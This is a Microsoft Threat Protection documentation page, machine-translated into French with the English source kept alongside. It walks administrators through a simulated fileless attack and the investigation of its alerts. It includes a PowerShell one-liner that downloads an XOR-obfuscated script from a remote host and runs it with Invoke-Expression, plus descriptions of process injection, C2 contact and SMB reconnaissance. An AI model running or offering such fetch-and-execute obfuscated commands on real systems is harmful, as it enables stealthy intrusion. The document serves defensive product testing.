---
title: Exécuter vos simulations d’attaque de la protection contre les menaces Microsoft
description: Exécutez des simulations d’attaque pour votre projet pilote Microsoft Threat Protection afin de déterminer le mode de dépliage et de déploiement rapide.
keywords: Simulation d’attaque pilote Microsoft Threat Protection, exécuter la simulation d’attaque pilote Microsoft Threat Protection, simuler une attaque dans Microsoft Threat Protection, Project Threat Protection pilote, Cyber Security, Advanced persistent, Enterprise Security, périphériques, Device, Identity, Users, Data, applications, incidents, analyse automatisée et correction, recherche avancée
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: microsoft-365-enterprise
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dolmont
author: DulceMontemayor
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-evalutatemtp
ms.topic: conceptual
ms.openlocfilehash: e6cf01f5540e383fb56e387cd07b455741221dc5
ms.sourcegitcommit: 9d8d071659e662c266b101377e24549963e43fef
ms.translationtype: MT
ms.contentlocale: fr-FR
ms.lasthandoff: 10/06/2020
ms.locfileid: "48368092"
---
# <a name="run-your-microsoft-threat-protection-attack-simulations"></a><span data-ttu-id="10d0c-104">Exécuter vos simulations d’attaque de la protection contre les menaces Microsoft</span><span class="sxs-lookup"><span data-stu-id="10d0c-104">Run your Microsoft Threat Protection attack simulations</span></span>  

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]


<span data-ttu-id="10d0c-105">**S’applique à :**</span><span class="sxs-lookup"><span data-stu-id="10d0c-105">**Applies to:**</span></span>
- <span data-ttu-id="10d0c-106">Protection Microsoft contre les menaces</span><span class="sxs-lookup"><span data-stu-id="10d0c-106">Microsoft Threat Protection</span></span>
<br>
<table border="0" width="100%" align="center">
  <tr style="text-align:center;">
    <td align="center" style="width:25%; border:0;" >
      <a href= "https://docs.microsoft.com/microsoft-365/security/mtp/mtp-pilot-plan"> 
        <img src="../../media/mtp/plan.png" alt="Plan your pilot Microsoft Threat Protection project" title="Planification de votre projet pilote de protection contre les menaces Microsoft" />
      <br/><span data-ttu-id="10d0c-108">Coplanaires </a></span><span class="sxs-lookup"><span data-stu-id="10d0c-108">Plan </a></span></span><br>
    </td>
    <td align="center">
      <a href="https://docs.microsoft.com/microsoft-365/security/mtp/prepare-mtpeval">
        <img src="../../media/mtp/prep.png" alt="Prepare your Microsoft Threat Protection trial lab or pilot environment" title="Préparation de votre laboratoire d’évaluation ou de votre environnement pilote Microsoft Threat Protection" />
      <br/><span data-ttu-id="10d0c-110">Instructions </a></span><span class="sxs-lookup"><span data-stu-id="10d0c-110">Prepare </a></span></span><br>
    </td>
    <td align="center"bgcolor="#d5f5e3">
      <a href="https://docs.microsoft.com/microsoft-365/security/mtp/mtp-pilot-simulate">
        <img src="../../media/mtp/run-sim.png" alt="Run your Microsoft Threat Protection attack simulations" title="Exécuter vos simulations d’attaque de la protection contre les menaces Microsoft" />
      <br/><span data-ttu-id="10d0c-112">Simuler une attaque </a></span><span class="sxs-lookup"><span data-stu-id="10d0c-112">Simulate attack </a></span></span><br>
    </td>
    <td align="center">
      <a href="https://docs.microsoft.com/microsoft-365/security/mtp/mtp-pilot-close">
        <img src="../../media/mtp/close.png" alt="Close and summarize your Microsoft Threat Protection pilot" title="Fermer et résumer votre programme pilote de protection contre les menaces Microsoft" />
      <br/><span data-ttu-id="10d0c-114">Fermer et résumer </a></span><span class="sxs-lookup"><span data-stu-id="10d0c-114">Close and summarize </a></span></span><br>
    </td>
  </tr>
  <tr>
    <td style="width:25%; border:0;">
   
    </td>
    <td valign="top" style="width:25%; border:0;">
    
</td>
    <td valign="top" style="width:25%; border:0;">

</td>    
    <td valign="top" style="width:25%; border:0;">

</td>
  </tr>
</table>

<span data-ttu-id="10d0c-115">Vous êtes actuellement en phase de simulation d’attaque.</span><span class="sxs-lookup"><span data-stu-id="10d0c-115">You're currently in the attack simulation phase.</span></span>

<span data-ttu-id="10d0c-116">Après avoir préparé votre environnement pilote, il est temps de tester la gestion des incidents de Microsoft Threat Protection, ainsi que les fonctionnalités d’analyse et de correction automatisées.</span><span class="sxs-lookup"><span data-stu-id="10d0c-116">After preparing your pilot environment, it’s time to test the Microsoft Threat Protection incident management and automated investigation and remediation capabilities.</span></span> <span data-ttu-id="10d0c-117">Nous vous aiderons à simuler une attaque sophistiquée qui exploite des techniques avancées pour masquer la détection.</span><span class="sxs-lookup"><span data-stu-id="10d0c-117">We will help you to simulate a sophisticated attack that leverages advanced techniques to hide from detection.</span></span> <span data-ttu-id="10d0c-118">L’attaque énumère les sessions SMB (Server Message Block) ouvertes sur les contrôleurs de domaine et récupère les adresses IP récentes des appareils des utilisateurs.</span><span class="sxs-lookup"><span data-stu-id="10d0c-118">The attack enumerates opened Server Message Block (SMB) sessions on domain controllers and retrieves recent IP addresses of users’ devices.</span></span> <span data-ttu-id="10d0c-119">En règle générale, cette catégorie d’attaques n’inclut pas les fichiers ignorés sur le périphérique de la victime : elle se produit uniquement en mémoire.</span><span class="sxs-lookup"><span data-stu-id="10d0c-119">This category of attacks usually doesn’t include files dropped on the victim’s device—they occur solely in memory.</span></span> <span data-ttu-id="10d0c-120">Ils « vivent en permanence » à l’aide d’outils système et d’administration existants et injectent leur code dans les processus système pour masquer leur exécution, ce qui leur permet d’échapper à la détection et de persister sur l’appareil.</span><span class="sxs-lookup"><span data-stu-id="10d0c-120">They “live off the land” by using existing system and administrative tools and inject their code into system processes to hide their execution, allowing them to evade detection and persist on the device.</span></span>

<span data-ttu-id="10d0c-121">Dans cette simulation, notre exemple de scénario commence par un script PowerShell.</span><span class="sxs-lookup"><span data-stu-id="10d0c-121">In this simulation, our sample scenario starts with a PowerShell script.</span></span> <span data-ttu-id="10d0c-122">Un utilisateur peut être amené à exécuter un script.</span><span class="sxs-lookup"><span data-stu-id="10d0c-122">A user might be tricked into running a script.</span></span> <span data-ttu-id="10d0c-123">Ou le script peut s’exécuter à partir d’une connexion distante à un autre ordinateur à partir d’un appareil précédemment infecté, qui tente de se déplacer par la suite sur le réseau.</span><span class="sxs-lookup"><span data-stu-id="10d0c-123">Or the script might run from a remote connection to another computer from a previously infected device—the attacker attempting to move laterally in the network.</span></span> <span data-ttu-id="10d0c-124">La détection de ces scripts peut être difficile, car les administrateurs exécutent souvent des scripts à distance pour effectuer diverses activités d’administration.</span><span class="sxs-lookup"><span data-stu-id="10d0c-124">Detection of these scripts can be difficult because administrators also often run scripts remotely to carry out various administrative activities.</span></span>

![Attaque PowerShell sans fichier avec injection de processus et diagramme d’attaque reconnaisance SMB](../../media/mtp/mtpdiydiagram.png)

<span data-ttu-id="10d0c-126">Pendant la simulation, l’attaque injecte shellcode dans un processus apparemment innocent.</span><span class="sxs-lookup"><span data-stu-id="10d0c-126">During the simulation, the attack injects shellcode into a seemingly innocent process.</span></span> <span data-ttu-id="10d0c-127">Dans ce scénario, nous allons utiliser notepad.exe.</span><span class="sxs-lookup"><span data-stu-id="10d0c-127">In this scenario, we’ll use notepad.exe.</span></span> <span data-ttu-id="10d0c-128">Nous avons choisi ce processus pour la simulation, mais les agresseurs seront plus susceptibles de cibler un processus système de longue durée, comme svchost.exe.</span><span class="sxs-lookup"><span data-stu-id="10d0c-128">We chose this process for the simulation, but attackers will more likely target a long-running system process, such as svchost.exe.</span></span> <span data-ttu-id="10d0c-129">Le shellcode se connecte ensuite pour contacter le serveur de commandes et de contrôle de l’agresseur (C2) afin de recevoir des instructions sur la procédure à suivre.</span><span class="sxs-lookup"><span data-stu-id="10d0c-129">The shellcode then goes on to contact the attacker’s command-and-control (C2) server to receive instructions on how to proceed.</span></span> <span data-ttu-id="10d0c-130">En outre, le script tente d’exécuter des requêtes de recherche sur le contrôleur de domaine.</span><span class="sxs-lookup"><span data-stu-id="10d0c-130">In addition, the script attempts executing reconnaissance queries against the domain controller (DC).</span></span> <span data-ttu-id="10d0c-131">Cela permet à un agresseur d’obtenir des informations sur les informations de connexion de l’utilisateur récentes.</span><span class="sxs-lookup"><span data-stu-id="10d0c-131">This allows an attacker to get information about recent user login information.</span></span> <span data-ttu-id="10d0c-132">Une fois que les attaquants disposent de ces informations, ils peuvent se déplacer par la suite sur le réseau pour accéder à un compte sensible spécifique.</span><span class="sxs-lookup"><span data-stu-id="10d0c-132">Once attackers have this information, they can move laterally in the network to get to a specific sensitive account</span></span>

>[!IMPORTANT]
><span data-ttu-id="10d0c-133">Pour obtenir des résultats optimaux, suivez les instructions de la simulation d’attaque aussi étroitement que possible.</span><span class="sxs-lookup"><span data-stu-id="10d0c-133">For optimum results, follow the attack simulation instructions as closely as possible.</span></span>


## <a name="simulation-environment-requirements"></a><span data-ttu-id="10d0c-134">Configuration requise pour l’environnement de simulation</span><span class="sxs-lookup"><span data-stu-id="10d0c-134">Simulation environment requirements</span></span>

<span data-ttu-id="10d0c-135">Étant donné que vous avez déjà configuré votre environnement pilote pendant la phase de préparation, vérifiez que vous disposez de deux appareils pour ce scénario : un périphérique de test et un contrôleur de domaine.</span><span class="sxs-lookup"><span data-stu-id="10d0c-135">Since you have already configured your pilot environment during the preparation phase, ensure that you have two devices for this scenario: a test device and a domain controller.</span></span>

1.  <span data-ttu-id="10d0c-136">Vérifiez que votre client a [activé Microsoft Threat Protection contre les menaces](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)Microsoft.</span><span class="sxs-lookup"><span data-stu-id="10d0c-136">Verify your tenant has [enabled Microsoft Threat Microsoft Threat Protection](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)￼￼.</span></span>
2.  <span data-ttu-id="10d0c-137">Vérifiez la configuration de votre contrôleur de domaine :</span><span class="sxs-lookup"><span data-stu-id="10d0c-137">Verify your test domain controller configuration:</span></span>
    - <span data-ttu-id="10d0c-138">Le périphérique s’exécute avec Windows Server 2008 R2 ou une version ultérieure.</span><span class="sxs-lookup"><span data-stu-id="10d0c-138">Device runs with Windows Server 2008 R2 or a later version.</span></span>
    - <span data-ttu-id="10d0c-139">Test du contrôleur de domaine dans [Azure Advanced Threat Protection](https://docs.microsoft.com/azure/security-center/security-center-wdatp) et activation de la [gestion à distance](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager).</span><span class="sxs-lookup"><span data-stu-id="10d0c-139">The test domain controller to [Azure Advanced Threat Protection](https://docs.microsoft.com/azure/security-center/security-center-wdatp) and enable [remote management](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager).</span></span>    
    - <span data-ttu-id="10d0c-140">Vérifiez que [Azure ATP et l’intégration de la sécurité de Microsoft Cloud App](https://docs.microsoft.com/cloud-app-security/aatp-integration) ont été activés.</span><span class="sxs-lookup"><span data-stu-id="10d0c-140">Verify that [Azure ATP and Microsoft Cloud App Security integration](https://docs.microsoft.com/cloud-app-security/aatp-integration) have been enabled.</span></span>
    - <span data-ttu-id="10d0c-141">Un utilisateur test est créé sur votre domaine – aucune autorisation d’administrateur n’est nécessaire.</span><span class="sxs-lookup"><span data-stu-id="10d0c-141">A test user is created on your domain – no admin permissions needed.</span></span>

3.  <span data-ttu-id="10d0c-142">Vérifiez la configuration du périphérique de test :</span><span class="sxs-lookup"><span data-stu-id="10d0c-142">Verify test device configuration:</span></span>
    <br>
    <span data-ttu-id="10d0c-143">a.</span><span class="sxs-lookup"><span data-stu-id="10d0c-143">a.</span></span>  <span data-ttu-id="10d0c-144">Le périphérique s’exécute avec Windows 10 version 1903 ou une version ultérieure.</span><span class="sxs-lookup"><span data-stu-id="10d0c-144">Device runs with Windows 10 version 1903 or a later version.</span></span>
    <br>
    <span data-ttu-id="10d0c-145">b.</span><span class="sxs-lookup"><span data-stu-id="10d0c-145">b.</span></span>  <span data-ttu-id="10d0c-146">Le périphérique de test est joint au domaine de test.</span><span class="sxs-lookup"><span data-stu-id="10d0c-146">Test device is joined to the test domain.</span></span>
    <br>
    <span data-ttu-id="10d0c-147">c.</span><span class="sxs-lookup"><span data-stu-id="10d0c-147">c.</span></span>  <span data-ttu-id="10d0c-148">[Activez l’antivirus Windows Defender](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span><span class="sxs-lookup"><span data-stu-id="10d0c-148">[Turn on Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span></span> <span data-ttu-id="10d0c-149">Si vous rencontrez des problèmes pour activer l’antivirus Windows Defender, consultez cette [rubrique de résolution des problèmes](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span><span class="sxs-lookup"><span data-stu-id="10d0c-149">If you are having trouble enabling Windows Defender Antivirus, see this [troubleshooting topic](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>
    <br>
    <span data-ttu-id="10d0c-150">d.</span><span class="sxs-lookup"><span data-stu-id="10d0c-150">d.</span></span>  <span data-ttu-id="10d0c-151">Vérifiez que le périphérique de test est [intégré à Microsoft Defender Advanced Threat Protection (MDATP)](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span><span class="sxs-lookup"><span data-stu-id="10d0c-151">Verify that the test device is [onboarded to Microsoft Defender Advanced Threat Protection (MDATP)](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

<span data-ttu-id="10d0c-152">Si vous utilisez un client existant et implémentez des groupes d’appareils, créez un groupe de périphériques dédié pour le périphérique de test et faites-le glisser vers le niveau supérieur dans l’expérience utilisateur de configuration.</span><span class="sxs-lookup"><span data-stu-id="10d0c-152">If you use an existing tenant and implement device groups, create a dedicated device group for the test device and push it to top level in configuration UX.</span></span>


## <a name="run-the-simulation"></a><span data-ttu-id="10d0c-153">Exécuter la simulation</span><span class="sxs-lookup"><span data-stu-id="10d0c-153">Run the simulation</span></span>

<span data-ttu-id="10d0c-154">Pour exécuter la simulation de scénario d’attaque :</span><span class="sxs-lookup"><span data-stu-id="10d0c-154">To run the attack scenario simulation:</span></span>

1.  <span data-ttu-id="10d0c-155">Connectez-vous au périphérique de test à l’aide du compte d’utilisateur test.</span><span class="sxs-lookup"><span data-stu-id="10d0c-155">Log in to the test device with the test user account.</span></span>

2.  <span data-ttu-id="10d0c-156">Ouvrez une fenêtre Windows PowerShell sur le périphérique de test.</span><span class="sxs-lookup"><span data-stu-id="10d0c-156">Open a Windows PowerShell window on the test device.</span></span>

3.  <span data-ttu-id="10d0c-157">Copiez le script de simulation suivant :</span><span class="sxs-lookup"><span data-stu-id="10d0c-157">Copy the following simulation script:</span></span>
```
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
= [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
-UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
$decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
$i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
```
>[!NOTE]
><span data-ttu-id="10d0c-158">Si vous ouvrez ce document dans un navigateur Web, vous pouvez rencontrer des problèmes lors de la copie du texte intégral sans perdre certains caractères ou introduire des sauts de ligne supplémentaires.</span><span class="sxs-lookup"><span data-stu-id="10d0c-158">If you open this document on a web browser, you might encounter problems copying the full text without losing certain characters or introducing extra line breaks.</span></span> <span data-ttu-id="10d0c-159">Téléchargez ce document et ouvrez-le sur Adobe Reader.</span><span class="sxs-lookup"><span data-stu-id="10d0c-159">Download this document and open it on Adobe Reader.</span></span>

4. <span data-ttu-id="10d0c-160">À l’invite, collez et exécutez le script copié.</span><span class="sxs-lookup"><span data-stu-id="10d0c-160">At the prompt, paste and run the copied script.</span></span>

>[!NOTE]
><span data-ttu-id="10d0c-161">Si vous exécutez PowerShell à l’aide du protocole RDP (Remote Desktop Protocol), utilisez la commande type de texte du presse-papiers dans le client RDP car la touche **Ctrl-V** ou la méthode de collage par clic droit peut ne pas fonctionner.</span><span class="sxs-lookup"><span data-stu-id="10d0c-161">If you're running PowerShell using remote desktop protocol (RDP), use the Type Clipboard Text command in the RDP client because the **CTRL-V** hotkey or right-click-paste method might not work.</span></span>  <span data-ttu-id="10d0c-162">Les versions récentes de PowerShell n’acceptent pas non plus cette méthode, il se peut que vous deviez d’abord copier le bloc-notes dans la mémoire, le copier dans l’ordinateur virtuel, puis le coller dans PowerShell.</span><span class="sxs-lookup"><span data-stu-id="10d0c-162">Recent versions of PowerShell sometimes will also not accept that method, you might have to copy to Notepad in memory first, copy it in the virtual machine, and then paste it into PowerShell.</span></span>

<span data-ttu-id="10d0c-163">Quelques secondes plus tard, <i>notepad.exe</i> s’ouvre.</span><span class="sxs-lookup"><span data-stu-id="10d0c-163">A few seconds later, <i>notepad.exe</i> will open.</span></span> <span data-ttu-id="10d0c-164">Un code d’attaque simulé est injecté dans notepad.exe.</span><span class="sxs-lookup"><span data-stu-id="10d0c-164">A simulated attack code will be injected into notepad.exe.</span></span> <span data-ttu-id="10d0c-165">Laissez l’instance du bloc-notes générée automatiquement ouverte pour découvrir le scénario complet.</span><span class="sxs-lookup"><span data-stu-id="10d0c-165">Keep the automatically generated Notepad instance open to experience the full scenario.</span></span>

<span data-ttu-id="10d0c-166">Le code d’attaque simulé tente de communiquer avec une adresse IP externe (simulant le serveur C2), puis d’effectuer des tentatives de reconnaissance par rapport au contrôleur de domaine via SMB.</span><span class="sxs-lookup"><span data-stu-id="10d0c-166">The simulated attack code will attempt to communicate to an external IP address (simulating the C2 server) and then attempt reconnaissance against the domain controller through SMB.</span></span>

<span data-ttu-id="10d0c-167">Une fois le script terminé, un message s’affiche dans la console PowerShell.</span><span class="sxs-lookup"><span data-stu-id="10d0c-167">You will see a message displayed on the PowerShell console when this script completes.</span></span>

```
ran NetSessionEnum against [DC Name] with return code result 0      
```

<span data-ttu-id="10d0c-168">Pour afficher la fonctionnalité automatisée incident et réponse en action, laissez le processus notepad.exe ouvert.</span><span class="sxs-lookup"><span data-stu-id="10d0c-168">To see the Automated Incident and Response feature in action, keep the notepad.exe process open.</span></span> <span data-ttu-id="10d0c-169">Vous verrez un incident et une réponse automatisés arrêter le processus Notepad.</span><span class="sxs-lookup"><span data-stu-id="10d0c-169">You will see Automated Incident and Response stop the Notepad process.</span></span>


## <a name="investigate-an-incident"></a><span data-ttu-id="10d0c-170">Examiner un incident</span><span class="sxs-lookup"><span data-stu-id="10d0c-170">Investigate an incident</span></span>

>[!NOTE]
><span data-ttu-id="10d0c-171">Avant d’aborder cette simulation, regardez la vidéo suivante pour voir comment la gestion des incidents vous permet de rassembler les alertes associées dans le cadre du processus d’enquête, où vous pouvez la trouver dans le portail et comment elle peut vous aider dans vos opérations de sécurité :</span><span class="sxs-lookup"><span data-stu-id="10d0c-171">Before we walk you through this simulation, watch the following video to see how incident management helps you piece the related alerts together as part of the investigation process, where you can find it in the portal, and how it can help you in your security operations:</span></span>

>[!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

<span data-ttu-id="10d0c-172">En passant au point de vue de l’analyste SOC, vous pouvez commencer à étudier l’attaque dans le portail du centre de sécurité Microsoft 365.</span><span class="sxs-lookup"><span data-stu-id="10d0c-172">Switching to the SOC analyst point of view, you can now start to investigate the attack in the Microsoft 365 Security Center portal.</span></span> 

1.  <span data-ttu-id="10d0c-173">Ouvrez la file d’attente des incidents du [portail du centre de sécurité Microsoft 365](https://security.microsoft.com/incidents) à partir de n’importe quel appareil.</span><span class="sxs-lookup"><span data-stu-id="10d0c-173">Open the [Microsoft 365 Security Center portal](https://security.microsoft.com/incidents) incident queue from any device.</span></span>

2.  <span data-ttu-id="10d0c-174">Accédez à **incidents** à partir du menu.</span><span class="sxs-lookup"><span data-stu-id="10d0c-174">Navigate to **Incidents** from the menu.</span></span> 

    ![Capture d’écran des incidents telle qu’elle apparaît dans le menu de gauche du centre de sécurité Microsoft 365](../../media/mtp/fig1.png)

3.  <span data-ttu-id="10d0c-176">Le nouvel incident pour l’attaque simulée apparaît dans la file d’attente des incidents.</span><span class="sxs-lookup"><span data-stu-id="10d0c-176">The new incident for the simulated attack will appear in the incident queue.</span></span>
 
    ![Capture d’écran de la file d’attente des incidents](../../media/mtp/fig2.png)


### <a name="investigate-the-attack-as-a-single-incident"></a><span data-ttu-id="10d0c-178">Analyser l’attaque comme un incident unique</span><span class="sxs-lookup"><span data-stu-id="10d0c-178">Investigate the attack as a single incident</span></span>

<span data-ttu-id="10d0c-179">La protection contre les menaces Microsoft met en corrélation les analyses et rassemble toutes les alertes et les analyses associées de différents produits en une seule entité incident.</span><span class="sxs-lookup"><span data-stu-id="10d0c-179">Microsoft Threat Protection correlates analytics and aggregates all related alerts and investigations from different products into one incident entity.</span></span> <span data-ttu-id="10d0c-180">De cette manière, Microsoft Threat Protection affiche un récit d’attaque plus large, ce qui permet à l’analyste SOC de comprendre et de répondre aux menaces complexes.</span><span class="sxs-lookup"><span data-stu-id="10d0c-180">By doing so, Microsoft Threat Protection shows a broader attack story, allowing the SOC analyst to understand and respond to complex threats.</span></span>

<span data-ttu-id="10d0c-181">Les alertes générées pendant cette simulation sont associées à la même menace et, par conséquent, sont automatiquement regroupées comme un seul incident.</span><span class="sxs-lookup"><span data-stu-id="10d0c-181">The alerts generated during this simulation are associated with the same threat, and as a result, are automatically aggregated as a single incident.</span></span>

<span data-ttu-id="10d0c-182">Pour afficher l’incident :</span><span class="sxs-lookup"><span data-stu-id="10d0c-182">To view the incident:</span></span>

1.  <span data-ttu-id="10d0c-183">Accédez à la file d’attente **incidents** .</span><span class="sxs-lookup"><span data-stu-id="10d0c-183">Navigate to the **Incidents** queue.</span></span>
 
    ![Capture d’écran des incidents à partir du menu de navigation](../../media/mtp/fig1.png)

2.  <span data-ttu-id="10d0c-185">Sélectionnez l’élément le plus récent en cliquant sur le cercle situé à gauche du nom de l’incident.</span><span class="sxs-lookup"><span data-stu-id="10d0c-185">Select the newest item by clicking on the circle located left of the incident name.</span></span> <span data-ttu-id="10d0c-186">Un volet latéral affiche des informations supplémentaires sur l’incident, y compris toutes les alertes associées.</span><span class="sxs-lookup"><span data-stu-id="10d0c-186">A side panel displays additional information about the incident, including all the related alerts.</span></span> <span data-ttu-id="10d0c-187">Chaque incident a un nom unique qui le décrit en fonction des attributs des alertes qu’il comprend.</span><span class="sxs-lookup"><span data-stu-id="10d0c-187">Each incident has a unique name that describes it based on the attributes of the alerts it includes.</span></span>

    ![Capture d’écran de la page incidents dans laquelle des alertes générées sont regroupées lors de la simulation](../../media/mtp/fig4.png)

    <span data-ttu-id="10d0c-189">Les alertes qui s’affichent dans le tableau de bord peuvent être filtrées en fonction des ressources de service : Azure ATP, sécurité des applications Cloud Microsoft, Microsoft Defender ATP, Microsoft Threat Protection et Office ATP.</span><span class="sxs-lookup"><span data-stu-id="10d0c-189">The alerts that shows in the dashboard can be filtered based on service resources: Azure ATP, Microsoft Cloud App Security, Microsoft Defender ATP, Microsoft Threat Protection, and Office ATP.</span></span>  

3.  <span data-ttu-id="10d0c-190">Sélectionnez **ouvrir la page incident** pour obtenir plus d’informations sur l’incident.</span><span class="sxs-lookup"><span data-stu-id="10d0c-190">Select **Open incident page** to get more information about the incident.</span></span>

    <span data-ttu-id="10d0c-191">Dans la page **incident** , vous pouvez voir toutes les alertes et les informations relatives à l’incident.</span><span class="sxs-lookup"><span data-stu-id="10d0c-191">In the **Incident** page, you can see all the alerts and information related to the incident.</span></span> <span data-ttu-id="10d0c-192">Cela inclut les entités et les biens impliqués dans l’alerte, la source de détection des alertes (Azure ATP, EDR) et la raison pour laquelle elles ont été associées.</span><span class="sxs-lookup"><span data-stu-id="10d0c-192">This includes the entities and assets that are involved in the alert, the detection source of the alerts (Azure ATP, EDR), and the reason they were linked together.</span></span> <span data-ttu-id="10d0c-193">L’examen de la liste des alertes incident indique la progression de l’attaque.</span><span class="sxs-lookup"><span data-stu-id="10d0c-193">Reviewing the incident alert list shows the progression of the attack.</span></span> <span data-ttu-id="10d0c-194">À partir de cette vue, vous pouvez voir et examiner les alertes individuelles.</span><span class="sxs-lookup"><span data-stu-id="10d0c-194">From this view, you can see and investigate the individual alerts.</span></span>

    <span data-ttu-id="10d0c-195">Vous pouvez également cliquer sur **gérer l’incident** dans le menu de droite, pour baliser l’incident, l’attribuer à vous-même et ajouter des commentaires.</span><span class="sxs-lookup"><span data-stu-id="10d0c-195">You can also click **Manage incident** from the right-hand menu, to tag the incident, assign it to yourself, and add comments.</span></span>

    ![Capture d’écran de l’endroit où cliquer sur gérer l’incident](../../media/mtp/fig5a.png)

    ![<span data-ttu-id="10d0c-197">Capture d’écran des champs du panneau gérer l’incident, qui vous permet de baliser l’incident, de l’attribuer à vous-même et d’ajouter des commentaires</span><span class="sxs-lookup"><span data-stu-id="10d0c-197">Screenshot of the fields on the manage incident panel where you can tag the incident, assign it to yourself, and add comments</span></span> ](../../media/mtp/fig5b.png)


### <a name="review-generated-alerts"></a><span data-ttu-id="10d0c-198">Examiner les alertes générées</span><span class="sxs-lookup"><span data-stu-id="10d0c-198">Review generated alerts</span></span> 

<span data-ttu-id="10d0c-199">Examinons certaines des alertes générées lors de l’attaque simulée.</span><span class="sxs-lookup"><span data-stu-id="10d0c-199">Let’s look at some of the alerts generated during the simulated attack.</span></span>

>[!NOTE]
><span data-ttu-id="10d0c-200">Nous allons passer en revue quelques-unes des alertes générées lors de l’attaque simulée.</span><span class="sxs-lookup"><span data-stu-id="10d0c-200">We’ll walk through only a few of the alerts generated during the simulated attack.</span></span> <span data-ttu-id="10d0c-201">En fonction de la version de Windows et des produits de protection contre les menaces Microsoft qui s’exécutent sur votre périphérique de test, vous pouvez voir d’autres alertes qui apparaissent dans un ordre légèrement différent.</span><span class="sxs-lookup"><span data-stu-id="10d0c-201">Depending on the version of Windows and the Microsoft Threat Protection products running on your test device, you might see more alerts that appear in a slightly different order.</span></span>

![Capture d’écran des alertes générées](../../media/mtp/fig6.png) 


<span data-ttu-id="10d0c-203">**Alerte : l’injection de processus suspects a été observée (source : Microsoft Defender ATP EDR)**</span><span class="sxs-lookup"><span data-stu-id="10d0c-203">**Alert: Suspicious process injection observed (Source: Microsoft Defender ATP EDR)**</span></span>

<span data-ttu-id="10d0c-204">Les attaquants avancés utilisent des méthodes sophistiquées et Stealthy pour persister en mémoire et masquer à partir des outils de détection.</span><span class="sxs-lookup"><span data-stu-id="10d0c-204">Advanced attackers use sophisticated and stealthy methods to persist in memory and hide from detection tools.</span></span> <span data-ttu-id="10d0c-205">Une technique courante consiste à opérer à partir d’un processus système approuvé plutôt que d’un exécutable malveillant, ce qui rend difficile les outils de détection et les opérations de sécurité pour détecter le code malveillant.</span><span class="sxs-lookup"><span data-stu-id="10d0c-205">One common technique is to operate from within a trusted system process rather than a malicious executable, making it hard for detection tools and security operations to spot the malicious code.</span></span>

<span data-ttu-id="10d0c-206">Pour permettre aux analystes SOC d’intercepter ces attaques avancées, les capteurs de mémoire approfondie de Microsoft Defender ATP fournissent à notre service Cloud une visibilité sans précédent dans diverses techniques d’injection de code interprocessus.</span><span class="sxs-lookup"><span data-stu-id="10d0c-206">To allow the SOC analysts to catch these advanced attacks, deep memory sensors in Microsoft Defender ATP provide our cloud service with unprecedented visibility into a variety of cross-process code injection techniques.</span></span> <span data-ttu-id="10d0c-207">La figure suivante montre comment Microsoft Defender ATP a été détecté et alerté lors de la tentative d’insertion de code dans <i>notepad.exe</i>.</span><span class="sxs-lookup"><span data-stu-id="10d0c-207">The following figure shows how Microsoft Defender ATP detected and alerted on the attempt to inject code to <i>notepad.exe</i>.</span></span>

![Capture d’écran de l’alerte pour l’injection de code potentiellement malveillant](../../media/mtp/fig7.png) 


<span data-ttu-id="10d0c-209">**Alerte : comportement inattendu observé par un processus exécuté sans argument de ligne de commande (source : Microsoft Defender ATP EDR)**</span><span class="sxs-lookup"><span data-stu-id="10d0c-209">**Alert: Unexpected behavior observed by a process run with no command line arguments (Source: Microsoft Defender ATP EDR)**</span></span>

<span data-ttu-id="10d0c-210">Les détections de Microsoft Defender ATP visent souvent l’attribut le plus courant d’une technique d’attaque.</span><span class="sxs-lookup"><span data-stu-id="10d0c-210">Microsoft Defender ATP detections often target the most common attribute of an attack technique.</span></span> <span data-ttu-id="10d0c-211">Cela garantit une durabilité et une augmentation de la barre permettant aux attaquants de passer à des tactiques plus récentes.</span><span class="sxs-lookup"><span data-stu-id="10d0c-211">This ensures durability and raises the bar for attackers to switch to newer tactics.</span></span>

<span data-ttu-id="10d0c-212">Nous utilisons des algorithmes d’apprentissage à grande échelle pour établir le comportement normal des processus courants au sein d’une organisation et à travers le monde et surveiller quand ces processus présentent des comportements anormaux.</span><span class="sxs-lookup"><span data-stu-id="10d0c-212">We employ large-scale learning algorithms to establish the normal behavior of common processes within an organization and worldwide and watch for when these processes exhibit anomalous behaviors.</span></span> <span data-ttu-id="10d0c-213">Ces comportements anormaux indiquent souvent que du code superflu a été introduit et est exécuté dans un processus autrement approuvé.</span><span class="sxs-lookup"><span data-stu-id="10d0c-213">These anomalous behaviors often indicate that extraneous code was introduced and is running in an otherwise trusted process.</span></span>

